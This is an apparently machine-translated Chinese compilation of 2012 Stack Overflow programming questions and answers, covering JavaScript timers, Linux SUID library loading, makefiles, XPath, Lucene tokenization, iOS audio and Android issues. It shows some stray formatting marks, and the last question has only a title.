调用函数 setCategoryTree 。*然后，此函数将变量 mainCategory 传递给 getRandomProducts，其中全局声明变量以维护其初始化。*...所以，我要做的是在导航栏中单击链接时重置 getRandomProducts 函数，并从单击的链接传递类别名称。但是，似乎没有工作，因此迭代发生得更频繁，因为有**多个**递归循环同时执行。`onclick` *`clearTimeout` **不仅如此，我的全局变量并没有按预期存储来自 setCategoryTree 的数据（基本上我试图使用类似于静态变量的全局变量）。我已经通过`window.alert`注释掉了所有这些行为。

以下是相关的 Javascript 代码：*** 

 ***```
var mainCategory = ""; // initialized from setCategoryTree
var category = mainCategory;

function getRandomProducts(category)
{
    //window.alert(category);
    if(typeof category == "undefined")
        category = "all";
    else
        clearTimeout(t);

    var req = new XMLHttpRequest();

    var products = document.getElementById("products");

    req.onreadystatechange = function()
    {
        if( (req.readyState == 4) && (req.status == 200) )
        {
            var result = req.responseText;
            products.innerHTML = result;
        }
    }
    req.open("GET", "default.php?category=" + category, true);
    req.send(null);

    var t = setTimeout("getRandomProducts()", 1000);
}

function setCategoryTree(link)
{
    var categoryTree = document.getElementById("categoryTree");

    /* climbing the DOM-tree to get the category name (innerHTML of highest "a" tag) */
        mainCategory = link.parentNode.parentNode.parentNode.getElementsByTagName("a")[0].innerHTML;

    var subcategory = link.innerHTML;

    categoryTree.innerHTML = "--&nbsp;" + mainCategory + "&nbsp;&nbsp;--&nbsp;" + subcategory;

    getRandomProducts(mainCategory);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:32:43.207

您正在`t`函数中设置变量。下次调用此函数时`t`，您将无法使用该 var。

因此，在函数上方设置变量（不在里面）

```
var randomProductsTimeout = false;

function getRandomProducts(category){

    randomProductsTimeout = setTimeout()[..] 
```***

# linux - Linux SUID config 导致二进制文件无法执行

> ID：10084796
> 
> 赞同：1
> 
> 时间：2012-04-10T07:28:38.140
> 
> 标签：linux, suid

我有一个二进制文件（名称是 bmu），在调用 statfs 函数时需要 root 权限。

操作系统是`SuSE Linux 2.6.16.60-0.21-smp`
运行 bmu 的用户是 test 并且是非 root 用户

```
test@SuSE:~> id
uid=1056(test) gid=0(root) groups=0(root),16(dialout),33(video) 
```

我已经测试了 3 种场景。

--->场景1
如果bmu没有配置SUID，可以执行bmu但调用会失败。

```
-rwxr-xr-x 1 test root 14389879 2012-04-10 10:38 bmu
```

--->场景2
如果bmu配置了SUID，当bmu通过test运行时会失败，提示“DBMS API Library 'libclntsh.so' loading failed”

```
-rwsr-sr-x 1 root root 14389879 2012-04-10 10:38 bmu
```

--->scenario 3
如果 bmu 以 root 运行，则执行成功。当然，无论是否配置了 SUID。

```
-rwxr-xr-x 1 root root 14389879 2012-04-10 10:38 bmu

-rwsr-sr-x 1 root root 14389879 2012-04-10 10:38 bmu
```

从场景二看，好像是`LD_LIBRARY_PATH`config的问题，但从场景一看，这应该不是`LD_LIBRARY_PATH`config的问题。从场景 3 中，我们可以发现 bmu 可以被 root 执行。

只有场景2有问题，所以有人可以提出一些建议吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:09:49.540

当程序以 setuid 运行时，`LD_LIBRARY_PATH`环境中的变量会被忽略，因为它是一个潜在的安全漏洞。

您应该使用`$ORIGIN`相对 rpath 链接到依赖库的二进制文件，或使用对库的绝对 rpath 引用。有关 $ORIGIN rpath 的详细信息，请参见[ld 手册页](http://www.kernel.org/doc/man-pages/online/pages/man8/ld.so.8.html)。

# jquery - jquery中的自定义上下文菜单

> ID：10084797
> 
> 赞同：1
> 
> 时间：2012-04-10T07:28:45.177
> 
> 标签：jquery, raphael

我有一个节点（Raphael rect）附加了事件拖动的情况。

```
r4.drag(dragMove, dragStart, dragStop); 
```

在 dragStop 处理程序中，我区分了拖动和右键单击事件

```
if (editLabelFlag == false) {
    if (event.which == 3) {
        event.preventDefault();
        $('#contextmenu').slideDown('fast').delay(1000).slideUp();
        // code for
    }
} else {
    // drag code
} 
```

我在 dragMove 处理程序中将 editLabelFlag 设置为 true 以区分拖动和单击停止显示浏览器上下文菜单，我已经给出了 event.preventDefault()。

我面临的问题是，这是第一次完美地发生，并且对于以后在节点上的所有右键单击，我只得到浏览器上下文菜单。我已经检查了 Firebug，发现 contextmenu div 始终保持无显示，并且仅在第一次成为显示块时才显示。我尝试使用 return false 而不是 event.preventDefault ，但这会在浏览器菜单下方显示我的菜单。

preventDefault 是否会导致此问题？请提供一些

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T03:30:11.810

这不是因为浏览器停止了任何事件，实际上我是在创建一个克隆并拖动原件。在 dragstart 中，克隆被放置在原始位置，并且在单击期间不会被删除。因此，没有为原始映射的事件适用于克隆，因此点击只发生了一次。

谢谢你的时间

# cocos2d-iphone - 在 iOS 上使用 Box2D 中的图像创建角色

> ID：10084798
> 
> 赞同：1
> 
> 时间：2012-04-10T07:28:51.540
> 
> 标签：cocos2d-iphone, box2d-iphone

我有一个角色的图像，包括（头部、左臂、右臂、身体、左腿、右腿等）。我想加入这些图像来创建一个像布娃娃这样的角色。有加入身体部位的教程，但是我不能用图像和精灵来做到这一点。

谁能帮我。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T18:00:50.803

Yannick Loriot 在这里写了一个教程：http: [//yannickloriot.com/2011/06/box2d-ragdoll-example-for-cocos2d/](http://yannickloriot.com/2011/06/box2d-ragdoll-example-for-cocos2d/)

博客文章指向应用程序的工作源代码：[https ://github.com/YannickL/Box2D-Examples](https://github.com/YannickL/Box2D-Examples)

# iphone - 我有一个在后台播放音频的 iPad 应用程序，但 ipod 控件没有显示应用程序图标

> ID：10084800
> 
> 赞同：1
> 
> 时间：2012-04-10T07:29:07.470
> 
> 标签：iphone, objective-c, ios, ios5

我的问题是 - 当我的 iPad 在后台播放音频时，“我的应用程序图标”不会出现。我正在使用 iPodMusicPlayer。为了在后台播放音频，我编写了这些代码..

```
- (void)viewDidAppear:(BOOL)animated {
      [super viewDidAppear:animated];
      [[UIApplication sharedApplication] beginReceivingRemoteControlEvents];
      [self becomeFirstResponder];
}

- (void)viewWillDisappear:(BOOL)animated
{
     [[UIApplication sharedApplication] endReceivingRemoteControlEvents];
     [self resignFirstResponder];
     [super viewWillDisappear:animated];
}

- (BOOL)canBecomeFirstResponder {
        return YES;
} 
```

// 当应用程序在后台时，iPod 控件将发送这些事件

```
- (void) remoteControlReceivedWithEvent: (UIEvent *) receivedEvent {
       if (receivedEvent.type == UIEventTypeRemoteControl) {
           switch (receivedEvent.subtype) {

           case UIEventSubtypeRemoteControlTogglePlayPause:
               [self performSelector:@selector(playPause:)];
               break;

           case UIEventSubtypeRemoteControlPreviousTrack:
            //[self previousSong:nil];
            //[self performSelector:@selector(previousSong:)];
            break;

           case UIEventSubtypeRemoteControlNextTrack:
               //[self performSelector:@selector(nextSong:)];
               break;
          default:
              break;
         }
     }
} 
```

和 info.plist 我还设置了“必需的后台模式”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T09:17:39.913

您还必须添加`UIBackgroundModes`到您的`Info.plist`并将其值设置为`audio`.

请查看 iOS 应用程序编程指南，特别是[应用程序状态和多任务部分](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html)，以获取有关如何在后台执行任务的详细信息。

**[更新]**

还将这两行添加到`application:didFinishLaunchingWithOptions:`您的`AppDelegate.m`：

```
[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];
[[AVAudioSession sharedInstance] setActive: YES error: nil]; 
```

当您开始播放音频时，此代码：

```
UIBackgroundTaskIdentifier newTaskId = UIBackgroundTaskInvalid;
[_player play];
newTaskId = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:NULL]; 
```

这应该这样做。在模拟器和设备上进行了测试。

# android - 如果我重新安装我的应用程序，我的应用程序的辅助功能服务将不起作用

> ID：10084804
> 
> 赞同：4
> 
> 时间：2012-04-10T07:29:16.173
> 
> 标签：android, service, accessibility

如果我在卸载我的应用程序之前没有取消选中“设置”->“辅助功能”下的“辅助功能服务”选项，则辅助功能服务不会与我的应用程序绑定。

注意：要让它再次工作，我需要重新启动手机

谁能建议我如何在不禁用辅助功能服务的情况下安全地重新安装我的应用程序

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-10T11:04:18.420

在调整服务设置后，我成功地重新安装了服务（并在此之后继续接收事件）。

我将*android:packageNames="com.example.android.apis"*（从教程中获得）更改为*android:packageNames="@null"*

截至今天，我在 xml 配置部分（对于 JB）：

```
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_description"
    android:packageNames="@null"
    android:accessibilityEventTypes="typeNotificationStateChanged"
    android:accessibilityFlags="flagDefault"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="false"
/> 
```

在 Java 部分（对于 pre-JB，在服务的*onServiceConnected()*中）：

```
 AccessibilityServiceInfo info = new AccessibilityServiceInfo();
    info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
    info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
    info.notificationTimeout = 100;
    info.packageNames = null;
    info.feedbackType = AccessibilityServiceInfo.DEFAULT;
    this.setServiceInfo(info); 
```

我希望这对您自己的情况有所帮助...

# c - 独立于源文件名的通用 makefile

> ID：10084811
> 
> 赞同：1
> 
> 时间：2012-04-10T07:29:48.797
> 
> 标签：c, makefile

我想创建一个通用的makefile，它可以使用源文件名对其进行编译，将其保存为目标文件和可执行文件。两个文件都使用原始源名称。谢谢您的帮助。

```
 exec: \

     compile
     ./helloworld  #I would like to input source outside the make file.

    compile: \

    helloworld.c 

    gcc -Wall helloworld.c -o helloworld #<==

    echo 'compiling'             
    touch compile

#I would like makefile to automatically save both object and exec. 
#as the source file name. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T13:07:17.757

Make 具有内置规则，如果它们具有相同的名称，它们知道如何从源文件创建可执行文件。所以你甚至根本不需要makefile！

```
$ ls
foobar.c

$ make foobar
cc foobar.c -o foobar 
```

并不是说没有必要弄乱 .SECONDARY 因为 make 有一个直接规则来从 .c 构建可执行文件，而无需先编译 .o（因此没有中间文件）。即使没有，保留 .o 文件也没有任何好处，因此不值得为此付出额外的努力（IMO）。

如果您想更改编译器或标志，您可以拥有一个只包含一些变量赋值的 makefile：

```
$ ls
foobar.c        Makefile

$ cat Makefile
CC = gcc
CFLAGS = -Wall

$ make foobar
gcc -Wall foobar.c -o foobar 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T08:18:57.430

您可以这样使用该`$(MAKECMDGOALS)`变量：

```
CFLAGS = -Wall

$(MAKECMDGOALS): $(MAKECMDGOALS).o 
```

然后像这样简单地调用Make：

```
make myfile 
```

如果你有 Make 3.81 或更高版本，那么这可以变成：

```
CFLAGS = -Wall

.SECONDARY:  # Prevents intermediate files from being deleted 
```

如果您对保存中间目标文件不感兴趣，那么您甚至不需要 Makefile。你可以简单地做：

```
make bar CFLAGS=-Wall 
```

# android - android中的进度条动作循环

> ID：10084815
> 
> 赞同：0
> 
> 时间：2012-04-10T07:30:04.180
> 
> 标签：android

我有这个进度条代码

```
ProgressDialog.show(this, "VVV","DDD", false,true,new DialogInterface.OnCancelListener()
        {
            public void onCancel(DialogInterface dialog)
            {
                //msgDisplay("Action is cancelled");
            }
        }); 
```

如何将此代码绑定到我执行的任何操作？

例如：

```
1\. i press the button 
2\. this progressbar will work
3\. i run my function for doing something
4\. when my function ends the progressbar will ends 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:35:59.990

实际上，您只需要在代码中实现**[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)**即可。

1.  只需在方法中包含 ProgressBar `onPreExecute()`。
2.  在方法中执行您的后台任务`doInBackground()`。例如，我运行我的函数来做某事
3.  关闭`onPostExecute()`方法内的 ProgressBar。

# cocoa - 在 NSOutlineView 中显示行颜色？

> ID：10084816
> 
> 赞同：0
> 
> 时间：2012-04-10T07:30:04.680
> 
> 标签：cocoa

我如何设法在 NSOutlineView 中显示行颜色，例如默认情况下在 NSTableView 中？

![在此处输入图像描述](../Images/8dc1e8dcd93538a81b4b55da9cf886ae.png)

![在此处输入图像描述](../Images/b0fc59f810b3ebb1d20a4f75f19bb87a.png)

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:01:06.087

如果你想在你的 NSOutlineView 中使用这个，你需要使用***Alternating Rows***。

您可以在*属性检查*器中更改它：

![在此处输入图像描述](../Images/ac4ce5602940d4cbe85a40224a8deb33.png)

# version-control - 资产存储库

> ID：10084817
> 
> 赞同：1
> 
> 时间：2012-04-10T07:30:05.303
> 
> 标签：version-control, assets, repository

我使用 mercurial 作为我的主要 scm 工具。在我使用 svn 和其他人之前，但所有这些存储库都是专门为使用纯文本代码而设计的。我的资产和文档是二进制文件，通常是大文件（每个文件 10~50 MB），我的问题不在于准确跟踪发生了什么变化，但我至少想要 scm 为我提供的代码基本功能：跟踪哪些文件已更改（谁，何时，评论...），历史备份和分布式同步。

如果您使用不同的存储库类型，您使用什么工具？如何将资产更改与代码更改联系起来？

# c# - 从图像中读取二维条码

> ID：10084824
> 
> 赞同：7
> 
> 时间：2012-04-10T07:30:33.817
> 
> 标签：c#, icsharpcode

我需要一个库来从 C# 项目（Windows 窗体）上的图像中读取二维条码（数据矩阵）。我尝试使用一些 SDK，但我尝试的 SDK 不是免费的。

是否有任何免费的 SDK 可以从图像中读取二维条码？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T11:53:37.527

有一个[可用的例子](http://wrb.home.xs4all.nl/Articles_2010/Article_WPFDataMatrix_P2_01.htm)：

```
 using DataMatrix.net;               // Add ref to DataMatrix.net.dll
  using System.Drawing;               // Add ref to System.Drawing.
  [...]

  // ---------------------------------------------------------------
  // Date      180310
  // Purpose   Get text from a DataMatrix image.
  // Entry     sFileName - Name of the barcode file (PNG, + path).
  // Return    The text.
  // Comments  See source, project DataMatrixTest, Program.cs.
  // ---------------------------------------------------------------
  private string DecodeText(string sFileName)
  {
      DmtxImageDecoder decoder = new DmtxImageDecoder();
      System.Drawing.Bitmap oBitmap = new System.Drawing.Bitmap(sFileName);
      List<string> oList = decoder.DecodeImage(oBitmap);

      StringBuilder sb = new StringBuilder();
      sb.Length = 0;
      foreach (string s in oList)
      {
          sb.Append(s);
      }
      return sb.ToString();
  } 
```

您将需要[DataMatrix.net](http://sourceforge.net/projects/datamatrixnet/)！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T12:07:54.103

我用过的最好的免费 Datamatrix 编码器\解码器是 libdmtx：[http](http://www.libdmtx.org/) ://www.libdmtx.org/ 。它有 c# 包装器，所以请随意使用它。我现在无法编写示例代码，但如果您无法自己处理，我稍后会为您提供帮助。

编辑：libdmtx 带有控制台实用程序 - 如果您能够使用控制台应用程序读取条形码，那么您肯定会使用代码读取它。

EDIT2：这里的代码示例： http: [//libdmtx.wikidot.com/libdmtx-net-wrapper](http://libdmtx.wikidot.com/libdmtx-net-wrapper)

我想知道你是否有包含一些其他信息的图片，除了条形码。问题是 - 我不知道任何免费\开源库来处理在图片上查找条形码，正确包含任何其他数据。这是其他数据矩阵实现的链接：[http ://www.libdmtx.org/resources.php](http://www.libdmtx.org/resources.php)

# xml - 通过某些实现选择元素的 XPath 查询

> ID：10084827
> 
> 赞同：2
> 
> 时间：2012-04-10T07:30:40.523
> 
> 标签：xml, xpath

从**http://www.namspace.org/impl选择由****XYZImpl实现的“****抽象**”节点的正确查询是什么？

 ****```
<...>
  <Abstract xmlns:q3="http://www.namspace.org/impl"
                xsi:type="q3:XYZImpl">
    <...></...>
  </Abstract>
  <Abstract xmlns:q8="http://www.namspace.org/another"
                xsi:type="q8:XYZImpl">
    <...></...>
  </Abstract>
 </...> 
```

**订单**和命名空间**前缀**不在**我**的控制之下

如果文档只包含唯一的实现，则以下查询“有效”：

```
//Abstract[contains(@xsi:type,'XYZImpl')] 
```

但我正在寻找**完全限定名称**（命名空间+名称）的正确规范...：/

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T13:28:06.450

**使用**：

```
 /*/Abstract
       [substring-after(@xsi:type, ':') = 'XYZImpl']
          [namespace::*
              [name() = substring-before(../@xsi:type, ':')
              and
               . = 'http://www.namspace.org/impl'
              ]
          ] 
```

这将选择`Abstract`XML 文档顶部元素的任何子元素，该元素的名称空间带有前缀，该前缀也是其`xsi:type`属性中包含的 QName 值的前缀。*而*属性中包含的 QName 值的“local-name”部分`xsi:type`正是 string `"XYZImpl"`。

**基于 XSLT 的验证**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:xsi="some:xsi">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/">
     <xsl:copy-of select=
      "/*/Abstract
           [substring-after(@xsi:type, ':') = 'XYZImpl']
              [namespace::*
                  [name() = substring-before(../@xsi:type, ':')
                  and
                   . = 'http://www.namspace.org/impl'
                  ]
              ]
      "/>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于以下 XML 文档时**（由提供者生成，通过使其格式正确）：

```
<t xmlns:xsi="some:xsi">
      <Abstract xmlns:q3="http://www.namspace.org/impl"
                    xsi:type="q3:XYZImpl">
       </Abstract>
      <Abstract xmlns:q8="http://www.namspace.org/another"
                    xsi:type="q8:XYZImpl">
      </Abstract>
</t> 
```

**选择所需的正确元素并将其复制到输出**：

```
<Abstract xmlns:q3="http://www.namspace.org/impl" xmlns:xsi="some:xsi" xsi:type="q3:XYZImpl"/> 
```

**请注意**：为了成功评估 XPath 表达式，`xsi`必须在您的 XPath 实现中注册带有前缀的适当名称空间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T09:43:46.697

当然，使用有效样本回答 xml 问题会更容易......

这可能不是最好的方法，但以下对我有用：

```
//Abstract[namespace::*[.="http://www.namspace.org/impl"] and contains(@xsi:type,":XYZImpl")] 
```****

# ios - 一堆带有 gcd 的请求

> ID：10084836
> 
> 赞同：0
> 
> 时间：2012-04-10T07:31:23.363
> 
> 标签：ios, objective-c, multithreading, grand-central-dispatch, nsoperation

所以任务如下：1）我有一个曲目ID，我需要向服务器询问所有曲目数据2）解析响应（这里我还有一个专辑ID）3）现在我有一个专辑ID，我需要向服务器询问所有专辑数据 4）解析响应（这里我还有一个艺术家 ID） 5）现在我有一个艺术家 ID，我需要向服务器询问所有艺术家数据

我想知道使用 gcd 执行此操作的正确方法是什么。3 dispatch_sync-s 在 dispatch_async 里面？我希望这一切都是一个操作，在后台运行，所以一开始我想到的是 NSOperation，但是所有的回调、解析、保存到核心数据都需要在后台线程上发生，所以我必须创建一个单独的运行循环用于回调以确保在我得到响应之前它不会被杀死并且不会阻塞 ui。

所以问题是我应该如何在这里使用 gcd，或者最好使用 nsoperation 和用于回调的 runloop 线程？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:17:27.153

我建议使用 NSOperation 和在主线程上执行的回调。

如果您考虑一下，您的工作流程非常有序：1 -> 3 -> 5；解析步骤（2 和 4）可能不会那么昂贵，因此您想在单独的线程上执行它们（我想它们根本不昂贵，与等待网络通信的时间相比，您可以忽略解析时间）。

此外，如果您使用像`AFNetworking`（甚至`NSURLConnection`+ 块）这样的通信框架，您的工作流程将很容易实现：

1.  检索轨迹数据
2.  在“检索曲目数据”响应处理程序中，获取专辑 ID，然后发送新的“专辑数据”请求；
3.  在“检索专辑数据”响应处理程序中，获取艺术家 ID，等等...

# user-interface - Emacs 的第一个 GUI 版本

> ID：10084842
> 
> 赞同：2
> 
> 时间：2012-04-10T07:31:58.603
> 
> 标签：user-interface, emacs

Emacs的[第一个](http://en.wikipedia.org/wiki/Emacs#History)版本在纯文本控制台上运行。目前，Emacs 可以使用该`-nw`参数以纯文本模式运行。Emacs的第一个*GUI*版本是什么时候发布的？是*GNU* Emacs 吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T08:09:59.743

对于 GNU Emacs，我在 NEWS 文件中看到的最早提及是在版本 18 中，它似乎从一开始就包含了某种形式的 X 支持。

这早于 Lucid 和 Epoch（Lucid 的来源）。

事实上，Epoch 被描述为：

> Emacs 18 的一组补丁，为它提供了更好的 GUI 支持（Emacs 18 在很大程度上是一个 tty 程序，GUI 支持作为事后的想法粗鲁地移植。）

很明显，在工作开始时已经存在一些 GUI 功能。

除非在 1986 年之前有一些鲜为人知的分支沿着这条道路走下去，否则 GNU Emacs 似乎肯定是第一个包含 GUI 支持的。

这是基于 Jamie Zawinski 非常丰富的时间表和历史：

*   [http://www.jwz.org/doc/emacs-timeline.html](http://www.jwz.org/doc/emacs-timeline.html)
*   [http://www.jwz.org/doc/lemacs.html](http://www.jwz.org/doc/lemacs.html)

# android - Android SDK 18.0.0 导致 Eclipse 错误

> ID：10084845
> 
> 赞同：2
> 
> 时间：2012-04-10T07:32:09.983
> 
> 标签：android

我无法使用新的 SDK(18.0.0) 打开我的 Eclipse 项目我收到 Java 错误，我知道它的 SDK，因为我可以在不更新的情况下使用 Eclipse，但是旧的 SDK 消失了，我被迫更新以继续我的应用程序。

这是 OnStartup 的错误：

在“初始化 Java 工具”期间发生内部错误。java.lang.NullPointerException

关闭时

关闭 java.lang.NullPointerException 时出现问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T23:36:12.553

不要删除所有完整的 .metadata

*   备份.元数据
*   仅删除 .metadata/.plugins/org.eclipse.core.resources/.project
*   重启日食

观察：创建项目文件夹

此外 - 如果您使用 svn/git/hg 有代码存储库链接，它将被破坏，所以要恢复

*   关闭日食
*   从备份中复制相关项目以与 .metadata/.plugins/org.eclipse.core.resources/.project 中的当前项目合并
*   重启日食

Downfall - 可能会发生零星的失败错误（同步或其他东西） - 无害

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T15:30:13.863

我通过关闭工作区中的所有项目并仅打开我需要的项目来解决它。我还没有找到真正的原因，但至少我可以继续工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:49:52.413

您是否更新了 ADT 插件？

# android - 如何获取 android 4.0.3 源码

> ID：10084846
> 
> 赞同：3
> 
> 时间：2012-04-10T07:32:11.320
> 
> 标签：android, android-source

我绝对知道有官方文章，http://source.android.com/source/downloading.html 并展示了如何获取源代码。但无论如何，在我的国家，我无法得到这个。谁能告诉我如何得到那个来源的存档文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-20T09:53:03.277

你可以在这里下载：

[4.0.3源码下载](http://concentriclivers.com/android_source/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T07:36:26.500

您所在的国家/地区是否可以访问 GitHub？如果是这样，Android 源代码可[在此处](https://github.com/android)获得。

# javascript - 如果鼠标在元素内，则延迟 mouseenter 事件并引发事件

> ID：10084848
> 
> 赞同：3
> 
> 时间：2012-04-10T07:32:18.703
> 
> 标签：javascript, jquery, asp.net, html

我使用这个基于 jQuery 开发的选项卡视图：

[https://d2o0t5hpnwv4c1.cloudfront.net/001_Tabbed/site/jQuery.html#](https://d2o0t5hpnwv4c1.cloudfront.net/001_Tabbed/site/jQuery.html#)

我更改选项卡按`mouseenter`事件更改的代码。并且我想延迟`mouseenter`事件的执行，因此如果鼠标进入元素并在其中停留部分时间`mouseenter`执行 else （如果鼠标在时间少于该部分时间的时间内离开）`mouseenter`不会执行。我编写了以下代码：

```
$(document).ready(function () {
        $('a.tab').on('mouseenter', function () {
            var thisElement = $(this);
            setTimeout(function () {
                $(".active").removeClass("active");
                thisElement.addClass("active");
                $(".content").slideUp();
                var content_show = thisElement.attr("title");
                $("#" + content_show).slideDown();
            }, 300);
        });
    }); 
```

但是如果我把鼠标从元素中`mouseenter`拿出来执行。如何解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-10T07:40:28.293

您需要存储超时句柄并将其取消`mouseleave`：

```
var timeout; 

$(document).ready(function () {
    $('a.tab').on('mouseenter', function () {
        var thisElement = $(this);

        if (timeout != null) { clearTimeout(timeout); }

        timeout = setTimeout(function () {
            $(".active").removeClass("active");
            thisElement.addClass("active");
            $(".content").slideUp();
            var content_show = thisElement.attr("title");
            $("#" + content_show).slideDown();
        }, 300);
    });

    $('a.tab').on('mouseleave', function () {
        if (timeout != null) { 
           clearTimeout(timeout); 

           timeout = null;
        }
    });
}); 
```

# asp.net-mvc - ASP.NET MVC - 更新外键

> ID：10084849
> 
> 赞同：0
> 
> 时间：2012-04-10T07:32:30.103
> 
> 标签：asp.net-mvc

我刚刚开始研究 ASP.NET MVC，并且我正在使用最新的测试版（即 4）。我正在寻找一个相当 CRUD 场景的正确方法。我的主表（任务）看起来像这样 -

TaskID (int) EmployeeID (int) ProjectID (int) DeptID (int) Comment (varchar) Date (datetime) Hours (float)

TaskID 是主键。其他三个 ID 都是引用表的外键。

按照各种教程，我使用实体框架创建了一个对象模型 (.edmx)。然后我使用“添加...控制器”自动生成控制器并选择“具有读/写功能的控制器...”模板。

一切运作良好。但是，显然我希望三个外键列显示来自引用表的查找值，而不是 ID。我真的不确定实现这一目标的“最佳实践”方法是什么。我想到了几个选择 -

1.  在 SQL Server 中创建视图
2.  在 EF 中创建一个视图（不知道这是如何完成的）
3.  在控制器中使用 LINQ 即时查找参考值

也许还有其他方法。我想听听经验丰富的 MVC progs 在这种情况下的“最佳实践”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T08:13:39.033

更愿意拥有 TaskViewModel 类，该类将具有类似这样的属性

```
public class TaskViewModel
{
    public Task Task { get; set; }
    public Dictionary<int, string> ProjectList { get; set; }
    //rest of the Lookup Properties like DeptList, EmpList
}
public class Task
{
    public int TaskId { get; set; }
    public int projectId { get; set; }
    //Rest of the properties
} 
```

并且会使用

```
@model TaskViewModel
@Html.DropDownListFor(m => m.Task.projectId, new SelectList(Model.ProjectList, "key", "value", Model.Task.projectId))%> 
```

# full-text-search - 无法在 lucene 索引中搜索所有生成的术语

> ID：10084854
> 
> 赞同：5
> 
> 时间：2012-04-10T07:32:51.087
> 
> 标签：full-text-search, lucene

我正在使用自定义分析器索引和搜索代码。给定文本“将 wi-fi 工作”，生成以下标记（“将”是停用词，被消除）。

```
wi-fi {position:2 start:5 end:10}
wifi {position:2 start:5 end:10}
wi {position:2 start:5 end:7}
fi {position:2 start:8 end:10}
work {position:3 start:11 end:15} 
```

当我搜索术语 wi-fi 时，我会得到搜索结果。但是，当我针对 wifi、wi、fi 发出任何查询（短语/非短语）时，我没有得到任何结果。生成的令牌有什么问题吗？

解析的搜索查询：

对于 wi-fi *（工作正常）*

```
Lucene's: +matchAllDocs:true +(alltext:wi-fi alltext:wifi alltext:wi alltext:fi) 
```

对于 wifi *（没有返回结果）*

```
Lucene's: +matchAllDocs:true +alltext:wifi 
```

对于“wi-fi 工作” *（工作正常）*

```
Lucene's: +matchAllDocs:true +alltext:"(wi-fi wifi wi fi) work" 
```

对于“wifi 会工作” *（没有返回结果）*

```
Lucene's: +matchAllDocs:true +alltext:"? wifi work" 
```

## 更新

发现问题：

```
public boolean incrementToken() throws IOException
{
    /*
     * first return all tokens in the list
     */
    if (tokens.size() > 0)
    {
        Token top = tokens.removeFirst();
        restoreState(current);
        **termAtt.setEmpty().append(new String(top.buffer(), 0, top.length()));**
        offsetAtt.setOffset(top.startOffset(), top.endOffset());
        posIncrAtt.setPositionIncrement(0);
        return true;
    }

    /*
     * if there are no more incoming tokens return false
     */
    if (!input.incrementToken())
        return false;

    Token wrapper = new Token();
    wrapper.copyBuffer(termAtt.buffer(), 0, termAtt.length());
    wrapper.setStartOffset(offsetAtt.startOffset());
    wrapper.setEndOffset(offsetAtt.endOffset());
    wrapper.setPositionIncrement(posIncrAtt.getPositionIncrement());

    normalizeHyphens(wrapper);
    current = captureState();
    return true;
} 
```

在上面的粗体线中，我说

```
termAtt.setEmpty().append(new String(top.buffer())); 
```

当我搜索**wi**时，我没有得到任何结果，但**wi***用于给出结果。看起来这个 top.buffer() 包含一些导致奇怪行为的额外垃圾。

在这上面浪费了一天:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:46:56.920

只是在不知道您的分析器或解析器的情况下猜测。

*   确保您在搜索中使用的单词 wi,fi 不是停用词的一部分。可能停止列表文件是您检查的地方
*   分面搜索/加权搜索。确保你没有弄乱这些。
*   解析/分析后，确保您确实获得了要搜索的标记化术语。
*   确保您的条款被推送到索引中。

# xml - 将 DataTable 数组转换为 DataSet

> ID：10084856
> 
> 赞同：1
> 
> 时间：2012-04-10T07:33:00.887
> 
> 标签：xml, datatable, dataset

我正在创建一个应该像 ASCII 一样工作的应用程序——你输入一个代码，它会加载一个布尔矩阵，它是其代码所在字符的图形表示。我需要能够保存并编辑它 - 因此我想到了使用 xml（我应该能够从它加载到另一个应用程序）。所有这些意味着我应该有一个表数组，它们以相同的方式排列，并且可以通过索引访问。问题是 - 我对数据集还不够熟悉，不知道这是否可行。我可以寻址数据集 [135].[5][7] 吗？我可以这样改变吗？我在这方面做得对吗？

# sql - Sql server中的临时表记录限制

> ID：10084857
> 
> 赞同：10
> 
> 时间：2012-04-10T07:33:03.130
> 
> 标签：sql, sql-server, sql-server-2008, temp-tables

